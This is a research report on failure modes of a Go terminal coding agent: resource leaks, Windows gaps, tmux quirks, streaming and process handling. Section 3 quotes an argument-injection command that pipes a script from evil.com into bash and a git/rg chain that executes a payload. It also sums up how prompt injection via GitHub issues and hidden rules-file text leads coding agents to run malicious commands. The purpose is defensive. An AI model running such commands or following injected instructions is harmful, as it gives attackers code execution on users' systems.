# The long tail of building a production TUI coding agent in Go

**AutoCode's biggest risks aren't in the happy path — they're in unbounded resource growth that makes the app unusable after 8 hours, Windows platform gaps that silently break core features, security holes that turn prompt injection into RCE, and terminal multiplexer incompatibilities that affect the majority of power users.** OpenCode, the most architecturally similar project (Go + Bubble Tea + SQLite), has already hit most of these walls: 30GB+ memory after half a day, 100% CPU during streaming, nil-pointer panics crashing the TUI, and terminal corruption that kills the user's entire shell session. Every issue documented below has been observed in production in at least one shipping coding agent. This report is organized from highest to lowest rewrite risk across all 11 research areas.

---

## 1. Resource exhaustion is the #1 production killer

The single most dangerous failure mode for a long-running TUI agent is **unbounded growth** — memory, goroutines, WAL files, and file descriptors accumulating silently until the app becomes unusable or the OOM killer strikes.

**Memory growth in long sessions** is well-documented in OpenCode. Issue #3013 reports memory climbing continuously during intensive AI sessions until the app freezes. Issue #9151 shows **30GB+ memory after half a day**. Issue #9743 shows the OOM killer triggering after 109GB virtual memory allocation. The root causes are consistent: unbounded string concatenation on streaming tool output (`output += chunk` with no cap), maps and subscription registries that never get cleared, async queues that prevent garbage collection, and O(n) re-rendering of the full conversation on every token arrival.

**Goroutine leaks** are structurally inevitable in Bubble Tea unless actively prevented. Bubble Tea commands (`tea.Cmd`) run in separate goroutines, and the source code contains this revealing comment: *"Don't wait on these goroutines... It's not possible to cancel them so we'll have to leak the goroutine until Cmd returns."* If a command blocks indefinitely — a hung HTTP request, a channel with no receiver, an LLM stream that never completes — the goroutine leaks permanently. Cmds don't receive a `context.Context`, so cancellation must be passed via closure.

**SQLite WAL file growth** is an insidious variant. In WAL mode, all writes append to the WAL file. A single unclosed `*sql.Rows` object (forgetting `defer rows.Close()`) prevents checkpoint operations from ever advancing, causing the WAL to grow **10-100x the database size**. The Turso engineering blog documents this as one of the most common Go+SQLite production bugs.

**CPU spinning during streaming** caused OpenCode to hit 100% across all 16 cores (Issue #2083). The root cause is O(n) text buffer recalculation on every token — when the conversation has 10,000 lines and you're re-rendering the entire `View()` on every single streamed token at 60 FPS, the math doesn't work.

The mitigations that must be architectural (not bolted on later):

- **Virtualized scrolling from day one** — only render visible lines in the viewport, never the full conversation. This is extremely expensive to retrofit.
- **Token batching** — don't send a `tea.Msg` per token. Batch tokens at ~16ms intervals (60 FPS frame budget). Use a `strings.Builder` with periodic flush, not string concatenation.
- **Bounded message storage** — keep only recent N messages in memory; offload older messages to SQLite. Use a ring buffer for the visible window.
- **Context cancellation in every Cmd** — pass `context.WithCancel` via closure into all command goroutines. Use `uber-go/goleak` in tests to detect leaks.
- **WAL checkpoint timer** — run `PRAGMA wal_checkpoint(TRUNCATE)` periodically. Enforce `defer rows.Close()` via linter rules.
- **Always-on pprof** — embed `net/http/pprof` on `localhost:6060` in every build. This is the only way to diagnose long-session resource growth in production.

Ignoring any of these risks a forced rewrite within months of launch.

---

## 2. Windows is a minefield of silent failures

Windows is not a second-class platform for a Claude Code competitor, but Bubble Tea treats it as one in several critical areas. **Three issues are architectural and must be solved from day one.**

**No SIGWINCH on Windows.** The Bubble Tea docs state explicitly: *"Windows does not have support for reporting when resizes occur as it does not support the SIGWINCH signal."* The `tea.WindowSizeMsg` fires on startup but **never again**. If a user resizes their terminal, the layout breaks silently. The fix is polling: run a tick command at ~30 FPS that checks `term.GetSize()` and emits a synthetic `WindowSizeMsg` when dimensions change. This must be platform-conditional code from day one.

**File locking breaks all write operations.** Windows uses mandatory file locking. When an IDE, antivirus scanner, or Windows Search indexer has a file open, `os.Remove()` and `os.WriteFile()` return "Access is denied." Unlike Unix advisory locks, this is enforced at the kernel level. The Go standard library has no built-in retry mechanism. Every file write must use an atomic temp-file-then-rename pattern with exponential backoff retries (3 attempts, 100ms/500ms/1s delays), checking specifically for `syscall.ERROR_SHARING_VIOLATION`.

**Process group management requires Job Objects.** On Unix, `Setpgid: true` plus killing the negative PID handles child process cleanup. On Windows, there are no process groups. You must create a Windows Job Object via `windows.CreateJobObject()`, assign child processes to it, and configure it to terminate all processes when the job is closed. Without this, every timed-out shell command leaves orphaned processes that hold ports, lock files, and accumulate until the system chokes. Codex CLI implemented this and still has ongoing issues (#2549, #10090).

Additional Windows-specific gotchas that matter:

- **PowerShell ISE has zero VT100 support** — detect it and refuse to run with a clear error message
- **Windows Terminal mouse doesn't work in AltScreen mode** (Issue #1391) — a known bug
- **Text selection doesn't work** inside Bubble Tea programs on PowerShell/CMD (Issue #1313), though it works in WSL
- **Minimum version is Windows 10 build 1809** — ConPTY is required; anything older produces garbage output
- **Successive `tea.Program` instances lose input on Windows** — the first character is swallowed (fixed in v2 beta, Issue #1368)

---

## 3. Prompt injection to RCE is an existential threat

The most critical security finding: **Trail of Bits demonstrated RCE in three production AI coding agents in October 2025** via argument injection in pre-approved commands. The attack pattern is devastatingly simple: commands like `go test` are whitelisted, but `go test -exec 'bash -c "curl evil.com | bash"'` executes arbitrary code. A second attack chain used only "safe" commands: `git show --output=payload` created a file, then `rg --pre bash` executed it.

This isn't theoretical. CheckMarx demonstrated "Lies-in-the-Loop" against Claude Code — prompt injection via GitHub issue content that tricks the LLM into running malicious commands, hiding the payload by pushing it off-screen with long output. NVIDIA demonstrated ASCII smuggling in Cursor's rules files at Black Hat. CVE-2025-54135 showed MCP file creation via indirect prompt injection in Cursor.

The required mitigations are non-negotiable:

- **OS-level sandboxing**: Linux needs Landlock LSM + seccomp BPF (Codex CLI's approach) or bubblewrap (Claude Code's approach). macOS needs Seatbelt/sandbox-exec profiles. Windows needs restricted tokens via `CreateRestrictedToken()` + Job Objects. Claude Code reduced permission prompts by **84%** after implementing sandboxing.
- **Never pass LLM output to `sh -c`**. Use `exec.Command(binary, arg1, arg2...)` with explicit argument separation.
- **Argument injection validation**: Check all command arguments against GTFOBins/LOLBins patterns. Watch for `-exec`, `--pre`, `--output`, `-x=` flags on otherwise safe commands.
- **Environment variable scrubbing**: Filter `*_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD` from child process environments. Codex CLI implements `shell_environment_policy` for this.
- **Untrusted repo config files**: Never auto-load `.autocode/config` from cloned repos without explicit user consent. This is a primary supply chain attack vector.
- **Path traversal prevention**: Use Go 1.24+'s `os.Root` type for directory-scoped file access. Always verify `filepath.Abs(target)` starts with project root prefix.

---

## 4. Terminal multiplexer compatibility requires specific workarounds

**tmux causes application freezes with AdaptiveColor.** When lipgloss queries the terminal for light/dark background via OSC 10/11, tmux versions before 3.4 don't forward the response. The query hangs **indefinitely** waiting for a terminal reply that never arrives (Issue #1036, #1160). This freezes the entire application on startup. The fix: detect `$TMUX` and disable adaptive color queries, forcing an explicit color profile.

**tmux kills the Kitty keyboard protocol.** Bubble Tea v2's enhanced keyboard support (key release events, disambiguated keys) via the Kitty protocol does not work through tmux (Issue #1178). `tea.KeyboardEnhancementsMsg` is never received. Applications must always fall back to legacy keyboard handling when tmux is detected.

**tmux scrollback causes progressive performance degradation.** Claude Code Issue #4851 documents severe lag after accumulating thousands of lines in tmux — the scrollback buffer "rewinds" causing rapid flashing, CPU spikes, and eventual unusability. Bubble Tea's alt screen buffer should prevent this, but output that leaks to the normal screen (e.g., during `tea.ExecProcess`) accumulates in scrollback.

**Colors disappear in tmux over SSH.** The `COLORTERM` environment variable isn't forwarded through SSH→tmux chains, causing Bubble Tea to detect no color support and render monochrome (Issue #825). Fix: `export COLORTERM=truecolor` in tmux config, or detect tmux and force a 256-color minimum.

**Mosh breaks OSC sequences and corrupts rendering.** Mosh's state-synchronization protocol does not pass through OSC sequences (clipboard, color queries, notifications). It can corrupt the screen with stray symbols during scrolling. Detect via `$MOSH_CLIENT` and disable OSC-dependent features. Document as "limited support."

The startup detection matrix that should run before any rendering begins:

- Check `TERM` (refuse if `dumb` or empty)
- Check `TMUX` (disable AdaptiveColor, disable Kitty keyboard, recommend ≥3.4)
- Check `STY` (GNU Screen: force ANSI-256, disable advanced features)
- Check `MOSH_CLIENT` (disable OSC features, reduce animation framerate)
- Check `SSH_CLIENT` (verify TERM forwarding)
- Check `WT_SESSION` (Windows Terminal: enable truecolor)
- Check `isatty(stdout)` (switch to non-TUI mode for CI/piped output)

---

## 5. Streaming architecture must unify four incompatible formats

Each LLM provider uses a different streaming protocol, and building provider-specific rendering logic **guarantees** a rewrite when you add the fourth provider.

**OpenAI** uses standard SSE (`data:` lines, `data: [DONE]` terminator). Content arrives in `choices[0].delta.content`. Tool call arguments arrive as **partial JSON fragments** that must be concatenated — `delta.tool_calls[0].function.arguments` contains incomplete JSON across multiple events.

**Anthropic** uses SSE with rich named event types: `message_start`, `content_block_start`, `content_block_delta`, `content_block_stop`, `message_delta`, `message_stop`, plus `ping` keep-alives. Content blocks are indexed, allowing interleaved text and tool use. Tool arguments arrive as `input_json_delta` (one complete key-value pair at a time). Extended thinking adds `thinking_delta` and `signature_delta` events.

**Ollama** doesn't use SSE at all — it uses **NDJSON** (newline-delimited JSON, `application/x-ndjson`). Each line is a complete JSON object with `"done": false/true`. No `data:` prefix, no event types.

**Google Gemini** uses SSE with the `alt=sse` URL parameter, but chunks are sentence/paragraph-level (not token-level), and every chunk includes cumulative usage metadata and safety ratings.

The unified internal event type must normalize all of these:

```go
type StreamEvent struct {
    Type      EventType // TextDelta, ToolStart, ToolDelta, ToolEnd, Thinking, Done, Error, Ping
    Text      string
    ToolCall  *ToolCallDelta
    Usage     *TokenUsage
    Metadata  map[string]any
}
```

**The #1 streaming timeout mistake in Go**: Using `http.Client.Timeout` for streaming. This covers the **entire** exchange including response body reads, killing long streams mid-response. A Cloudflare blog post details this. Use `Transport.ResponseHeaderTimeout` for initial connection, then a **rolling deadline timer** that resets on each data received for body reads.

**Non-streaming fallback is essential.** OpenCode Issue #785 (31+ upvotes) documents that proxy providers don't support streaming. Corporate proxies with SSL inspection buffer chunked responses, destroying real-time streaming. The entire rendering pipeline must work without streaming from day one.

---

## 6. Bubble Tea has 12 known issues that affect production agents

These are confirmed bugs or limitations in Bubble Tea and its ecosystem, ranked by severity for a coding agent:

**CRITICAL: Deadlock on context cancellation** (Issue #1370). When using `tea.WithContext()`, cancelling the context during high message pressure deadlocks the event loop. The cmds channel has no receiver after `handleCommands` exits.

**CRITICAL: `tea.ExecProcess` output leaks** (Issue #431). Before executing a subprocess, `View()` output is written to stdout. Workaround: set a `quitting` flag and return empty string from `View()` before exec.

**CRITICAL: Input loss on `ReleaseTerminal`** (Issue #616). The async input reader consumes bytes concurrently with the cancellation signal, causing lost keystrokes when suspending/resuming. A detailed analysis at dr-knz.net/bubbletea-control-inversion.html concludes Bubble Tea is *"only suitable for interactive use with relatively slow human input"* for reliable programmatic control.

**HIGH: Viewport scroll bugs with large content** (Issue #479). Viewport may not scroll to the end of large text — `ScrollPercent` reports 100% but content is cropped. UTF-8 content triggers incorrect line wrapping (counts bytes, not runes; Issue #742).

**HIGH: Textarea cursor/viewport desync** (Issue #839). `MoveToBegin()`, `MoveToEnd()`, `CursorUp()`, `CursorDown()` don't keep the viewport scrolled correctly — the cursor goes out of view.

**HIGH: Textarea/viewport key binding conflicts** (Issue #1106). When textarea is focused, pressing 'b' or 'd' scrolls the viewport because it has default keybindings for those keys. Must implement explicit focus/key routing.

**HIGH: Emoji/CJK width miscalculation** (Issue #562). `ansi.StringWidth()` returns incorrect display widths for emoji ZWJ sequences and CJK characters, causing misaligned layouts. The underlying `go-runewidth` library explicitly warns against per-rune width calculation — only `StringWidth()` is correct.

**MEDIUM: `View()` called before first `WindowSizeMsg`** (Issue #282). Layout renders with zero dimensions on startup. Guard with a `ready` flag set on first `WindowSizeMsg`.

**MEDIUM: Window title persists after exit** (Issue #1474). The terminal title set by the application is not restored on program exit or alt screen exit.

**MEDIUM: `p.Send()` blocks after program exit in v1** (Discussion #294). If a background goroutine calls `Send()` on a terminated program, it blocks forever. In v2, it's a no-op (safe).

**LOW: `tea.Batch` has no ordering guarantees.** Each command runs in its own goroutine. Use `tea.Sequence()` when ordering matters.

**LOW: Timer drift in `tea.Tick`.** Each tick's duration starts when the previous completes, so jitter accumulates. Use `tea.Every` for clock-aligned tasks (WAL checkpoints, health checks).

---

## 7. Process execution has four "must solve" edge cases

**Orphaned process cleanup** is the highest-priority execution concern. `exec.CommandContext` kills only the direct child process, **not its descendants**. If the child is `sh -c "npm install"`, killing `sh` leaves `npm` running. On Unix, set `SysProcAttr.Setpgid = true` and kill with negative PID (`syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)`). On Windows, use Job Objects. Go 1.20+ adds `cmd.WaitDelay` to bound how long `Wait()` blocks waiting for grandchild pipes to close — without this, `CombinedOutput()` can hang indefinitely even after the timeout fires.

**Infinite output commands** can consume all memory in seconds. `yes`, `cat /dev/urandom`, `find / -name '*'` are all valid commands an LLM might generate. Cap stdout/stderr with `io.LimitReader` at 1-10MB, plus a line count limit (~10,000 lines). Use a ring buffer to keep only the last N bytes when the limit is hit. Kill the process group when limits are exceeded.

**Commands that modify terminal state** (`stty`, `reset`, `clear`, `vim`, `less`) will corrupt Bubble Tea's raw mode. Always use `tea.ExecProcess` for known-interactive commands, which properly suspends and resumes the TUI. After any command execution, verify terminal state and issue a `stty sane` equivalent if corruption is detected.

**Zombie process accumulation** occurs when `cmd.Start()` is called without `cmd.Wait()`. Go does not automatically reap children. Always pair them, typically with `cmd.Wait()` in a goroutine. In Docker containers, ensure PID 1 is a proper init process (`dumb-init` or `tini`).

---

## 8. File system operations need defensive patterns for six platforms

**Circular symlink detection on Windows** is broken in Go itself. `filepath.Walk()` on Windows follows directory symlinks and NTFS junctions, causing infinite loops (Go issue #17540). `os.Stat()` enters an infinite busy-loop on circular symlinks on Windows (Go issue #16538). The fix: always use `os.Lstat()` instead of `os.Stat()`, check for `os.ModeSymlink`, and track visited inodes in a `map[uint64]bool` using `syscall.Stat_t.Ino` and `Dev` fields.

**.gitignore respect is non-optional.** Without it, the agent reads `node_modules/` (hundreds of thousands of files), `.git/objects/`, `vendor/`, etc. This makes the tool unusable on any real project. Use `go-git` or shell out to `git ls-files` for accurate parsing. Always skip `.git/`, `node_modules/`, `__pycache__/`, `.next/`, `dist/`, `build/` by default.

**Binary file detection** prevents garbage output and LLM context pollution. Combine three methods: `net/http.DetectContentType(first512bytes)` for MIME sniffing, check for NULL bytes in first 8KB (Git's approach), and maintain a set of known binary extensions. All three together have near-zero false positives.

**fsnotify watch limits on Linux** default to 8,192-125,000 depending on kernel version. A large repo with `node_modules` easily exceeds this. Each watched directory consumes ~1KB of kernel memory. Watch directories (not files), respect `.gitignore` to exclude irrelevant paths, check the limit at startup via `/proc/sys/fs/inotify/max_user_watches`, and degrade gracefully to polling when limits are hit. **fsnotify does not work at all on NFS/SMB/SSHFS** — detect network filesystems via `/proc/mounts` and fall back to polling.

---

## 9. Concurrency patterns for SQLite and the Elm architecture

**SQLite driver choice determines cross-compilation feasibility.** `mattn/go-sqlite3` requires CGo (C compiler for each target platform), making cross-compilation painful. `modernc.org/sqlite` is a transpiled pure-Go version — no CGo required, easy cross-compilation, ~1.5-2x slower on simple inserts but **actually faster for concurrent reads** in benchmarks (2,139ms vs 2,830ms at N=8 concurrent readers). Use **`zombiezen/go-sqlite`** which wraps modernc with a better API, built-in connection pooling via `sqlitex.Pool`, and context cancellation support via `SetInterrupt`. For a TUI agent's workload (conversation messages, not bulk data), the performance difference is negligible.

**The dual-pool pattern is mandatory for concurrent SQLite.** SQLite is single-writer, multiple-reader. Create two `sql.DB` pools: a writer pool with `MaxOpenConns(1)` and a reader pool with multiple connections. Set `PRAGMA journal_mode=WAL`, `PRAGMA synchronous=NORMAL`, `PRAGMA busy_timeout=5000`, `PRAGMA temp_store=MEMORY`. Without `busy_timeout`, concurrent access produces `SQLITE_BUSY` errors that crash or corrupt sessions.

**`tea.Batch` ordering is explicitly non-deterministic.** The docs state: *"BatchMsg is a message used to perform a bunch of commands concurrently with no ordering guarantees."* Each command runs in its own goroutine. If two commands update the same state, the result depends on scheduling. Use `tea.Sequence()` for dependent operations, or sequence counters in messages for ordering.

**Context cancellation during `Update()` can leave inconsistent state.** If a context cancels mid-way through a multi-step state transition in `Update()`, the model may be left in a partial state. Make state transitions atomic — compute the new state fully, then assign it in one step. Check `context.Done()` before starting operations, not during them.

---

## 10. Go-specific gotchas that compound over time

**GC pauses are a non-issue for terminal rendering.** Go's GC has sub-millisecond STW pauses since Go 1.7, with real-world measurements showing <500μs even with 18GB heaps. The 16.67ms budget at 60 FPS is 30x larger. However, **GC mark assist** can cause 7-10ms spikes when allocation rate is extremely high, which is why reducing allocations in `View()` still matters.

**`View()` allocation is the real performance concern.** Go strings are immutable; every concatenation allocates a new string. A naive `View()` using `s += fmt.Sprintf(...)` for 1,000 messages creates O(n²) allocations. Use `strings.Builder` with `Grow()` pre-allocation. Cache rendered output for unchanged model state via memoization. Bubble Tea's own textarea component added memoization in Bubbles v0.18.0 to fix rendering performance. There's a known bug (Issue #1004) where `strings.Builder` output can cause partial screen rendering when output exactly matches terminal height.

**Binary size grows quickly with dependencies.** A baseline Go binary is 10-20MB. Adding CGo SQLite adds 5-10MB. Tree-sitter adds more. Use `go build -ldflags="-w -s"` to strip debug info (saves 30-40%). UPX compression achieves ~73% reduction but adds startup decompression time. The strongest mitigation is eliminating CGo dependencies: `zombiezen/go-sqlite` for SQLite, and evaluating `malivvan/tree-sitter` (CGo-free via WASM/wazero) when it matures.

**Cross-compilation breaks with any CGo dependency.** Go's effortless cross-compilation is one of its biggest advantages, but `CGO_ENABLED=1` requires a C compiler for the target platform. If `mattn/go-sqlite3` or `smacker/go-tree-sitter` is in the dependency tree, building darwin/arm64 from a Linux CI requires `musl-cross` or zig as CC. The goreleaser-cross Docker image exists but adds significant CI complexity. **Prefer pure-Go dependencies wherever possible.**

**Lack of sum types means silent message drops.** Go has no exhaustive type switches. If a new message type is added to Bubble Tea or your codebase and the `Update()` switch doesn't handle it, the message is silently ignored. Use the `exhaustive` linter to catch this at build time. Define all message types in a single file for visibility.

---

## 11. Accessibility requires a fundamentally different rendering mode

A January 2026 article titled "The text mode lie: why modern TUIs are a nightmare for accessibility" documents the core problem: Bubble Tea treats the terminal as a 2D canvas, rewriting the entire screen on every update. Screen readers (Speakup, NVDA, JAWS) track cursor position. When the framework teleports the cursor to update spinners, status bars, and streaming text, the screen reader reads random fragments. Animations cause constant redraws that spam the user. Large conversation histories with reactive rendering cause **input lag of up to 10 seconds per keystroke**.

OpenCode has an open issue (#8565) requesting an accessibility mode. This cannot be retrofitted — it requires a fundamentally different output approach.

The only viable pattern: **design a `--no-tui` / `TERM=dumb` mode from day one** that outputs linearly to stdout without cursor movement, animations, or screen clearing. Bubble Tea provides `tea.WithoutRenderer()` for this. Use it when `TERM=dumb`, `!isatty(stdout)`, or an `--accessible` flag is set. This mode also serves CI/CD, Docker without `-t`, and piped output scenarios. If this mode isn't in the architecture from the start, adding it later means duplicating the entire rendering pipeline.

---

## 12. Future compatibility has three high-value, low-risk bets

**MCP (Model Context Protocol) in Go is production-ready.** The official `github.com/modelcontextprotocol/go-sdk`, maintained in collaboration with Google, implements the full spec (2025-11-25) with client and server support, stdio/HTTP/streamable HTTP transports, and tool calling. Use MCP as the plugin system — each plugin is an MCP server in any language. This eliminates the need for a custom plugin infrastructure entirely.

**Tree-sitter without CGo is pre-release but trackable.** `smacker/go-tree-sitter` (534 stars, mature) requires CGo. `malivvan/tree-sitter` wraps tree-sitter compiled to WASM via wazero, eliminating CGo entirely. It's pre-release ("expect bugs and API breaking changes"). For v1, accept CGo for tree-sitter; for v2, migrate to the WASM version when it stabilizes. For basic code structure analysis without tree-sitter, Go's `go/parser` works for Go files and regex-based extraction covers other languages.

**LSP client needs only 4-5 methods.** A full LSP client is ~2-3 months of work (100+ method types), but a coding agent only needs `textDocument/completion`, `textDocument/diagnostic`, `textDocument/definition`, and `textDocument/hover`. Use `go.lsp.dev/protocol` for type definitions and JSON-RPC transport. Spawn language servers as child processes via stdio. This can be added incrementally without architectural changes.

---

## Conclusion: the 8 decisions that prevent a rewrite

The research across 11 areas and 5 competing tools reveals that production TUI agent failures cluster around a small number of architectural decisions that are expensive to change later:

1. **Virtualized viewport rendering** must be designed from day one — O(n) re-rendering of the full conversation per token causes CPU spinning and memory growth that makes the app unusable within hours. OpenCode hit this wall repeatedly.

2. **A unified streaming abstraction** across all LLM providers prevents the rendering pipeline from coupling to any single provider's format. The four-format divergence (OpenAI SSE, Anthropic rich SSE, Ollama NDJSON, Gemini chunked SSE) plus non-streaming fallback must be behind one interface.

3. **OS-level sandboxing** is non-negotiable given demonstrated RCE via argument injection. Landlock+seccomp on Linux, Seatbelt on macOS, Job Objects on Windows. Claude Code reduced permission prompts by 84% after adding sandboxing.

4. **Windows resize polling** via tick-based `term.GetSize()` must be in from the start — SIGWINCH doesn't exist on Windows.

5. **A non-TUI output mode** (`--no-tui` / `TERM=dumb`) prevents forcing a parallel rendering pipeline later for accessibility, CI/CD, Docker, and piped output.

6. **Pure-Go SQLite** (zombiezen/go-sqlite over mattn/go-sqlite3) preserves Go's cross-compilation advantage, which is one of the primary benefits of choosing Go in the first place.

7. **Process group management** with platform-specific cleanup (negative PID kill on Unix, Job Objects on Windows) prevents orphaned process accumulation that makes the tool destructive to the user's system.

8. **A Ctrl+C state machine** (cancel current operation → warn → quit) rather than immediate exit prevents users from losing work — every competing tool has converged on this pattern.

No individual edge case in this report is insurmountable. The risk is in the aggregate: any five of these ignored simultaneously create a product that works in demos but fails in production. The good news is that OpenCode, Claude Code, Codex CLI, and Aider have already discovered most of these failure modes — AutoCode can learn from their mistakes rather than repeating them.